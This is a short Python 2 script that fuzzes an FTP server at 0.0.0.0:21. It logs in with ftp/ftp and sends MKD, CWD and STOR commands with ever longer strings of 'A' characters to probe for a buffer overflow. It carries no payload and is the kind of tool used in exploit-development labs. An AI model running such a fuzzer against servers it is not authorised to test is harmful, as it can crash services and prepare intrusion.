#!/usr/bin/python

import socket
import sys

print " Hi There "


buffer=["A"]
counter=20
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+100

commands=["MKD","CWD","STOR"]
print "Accepting your given commands"
for command in commands:
	for string in buffer:
		print "Fuzzing " + command + " with length:" +str(len(string))
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect(('0.0.0.0',21))
		s.recv(1024)
		s.send('USER ftp\r\n')
		s.recv(1024)
		s.send('PASS ftp\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n')
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()
